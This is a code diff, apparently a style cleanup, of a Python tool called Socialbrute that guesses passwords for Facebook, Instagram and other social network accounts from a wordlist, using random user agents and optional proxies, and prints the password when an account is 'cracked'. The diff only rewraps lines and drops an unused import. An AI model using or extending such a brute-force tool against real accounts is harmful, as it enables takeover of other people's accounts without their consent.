@@ -1,6 +1,5 @@
 # -*- coding: utf-8 -*-
 
-import sys
 import random
 import click
 from yaspin import yaspin
@@ -36,13 +35,17 @@ USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.812.0 Safari/535.1",
 ]
 
+
 class Socialbrute(object):
-    
+
     def __init__(self, interactive=True, proxy=None):
         self.browser = Browser()
         ua = random.choice(USER_AGENTS)
         if proxy:
-            self.browser.start(headless=interactive, proxy=proxy, user_agent=ua)
+            self.browser.start(
+                headless=interactive,
+                proxy=proxy,
+                user_agent=ua)
         else:
             self.browser.start(headless=interactive, user_agent=ua)
 
@@ -50,16 +53,21 @@ class Socialbrute(object):
         self.browser.stop()
 
     def run(self, social, username, wordlist, delay, token, proxy=None):
-        total = len(open(wordlist,'r').read().split('\n'))
+        total = len(open(wordlist, 'r').read().split('\n'))
 
-        click.echo('     Social Network: ' + (Colors.YELLOW) + social.capitalize() + (Colors.ENDC))
-        click.echo('           Wordlist: ' + (Colors.YELLOW) + wordlist + (Colors.ENDC))
-        click.echo('        Total Words: ' + (Colors.YELLOW) + str(total) + (Colors.ENDC))
-        click.echo('              Delay: ' + (Colors.YELLOW) + str(delay) + (Colors.ENDC))
+        click.echo('     Social Network: ' + (Colors.YELLOW) +
+                   social.capitalize() + (Colors.ENDC))
+        click.echo('           Wordlist: ' +
+                   (Colors.YELLOW) + wordlist + (Colors.ENDC))
+        click.echo('        Total Words: ' + (Colors.YELLOW) +
+                   str(total) + (Colors.ENDC))
+        click.echo('              Delay: ' + (Colors.YELLOW) +
+                   str(delay) + (Colors.ENDC))
 
-        # to resolve the UnboundLocalError: local variable 'a' referenced before assignment
+        # to resolve the UnboundLocalError: local variable 'a' referenced
+        # before assignment
         a = None
-        
+
         if social == 'facebook':
             a = Facebook(self.browser)
         elif social == 'instagram':
@@ -83,12 +91,16 @@ class Socialbrute(object):
         a.set_config(username, wordlist, delay)
         user_exists = a.check_user()
 
-        click.echo('           Username: ' + (Colors.YELLOW) + username + (Colors.ENDC))
-        click.echo('     Extracted Name: ' + (Colors.YELLOW) + a.name + (Colors.ENDC))
+        click.echo('           Username: ' +
+                   (Colors.YELLOW) + username + (Colors.ENDC))
+        click.echo('     Extracted Name: ' +
+                   (Colors.YELLOW) + a.name + (Colors.ENDC))
         click.echo('')
 
         if not user_exists:
-            print_error("It was not possible to retrieve the name from %s." % (social.capitalize()))
+            print_error(
+                "It was not possible to retrieve the name from %s." %
+                (social.capitalize()))
             click.confirm('Do you want to continue?', abort=True)
 
         with yaspin(text="Brute forcing... Please wait...", color="cyan") as sp:
@@ -96,9 +108,20 @@ class Socialbrute(object):
             if password:
                 sp.ok("✔")
                 print_success("Account cracked!")
-                click.echo("Username: " + (Colors.GREEN) + (Colors.BOLD) + "%s" % username + (Colors.ENDC))
-                click.echo("Password: " + (Colors.GREEN) + (Colors.BOLD) + "%s" % password + (Colors.ENDC))
+                click.echo("Username: " +
+                           (Colors.GREEN) +
+                           (Colors.BOLD) +
+                           "%s" %
+                           username +
+                           (Colors.ENDC))
+                click.echo("Password: " +
+                           (Colors.GREEN) +
+                           (Colors.BOLD) +
+                           "%s" %
+                           password +
+                           (Colors.ENDC))
             else:
                 sp.fail("✗")
-                print_error("Account not cracked! Try to crack it with another wordlist.")
+                print_error(
+                    "Account not cracked! Try to crack it with another wordlist.")
                 return
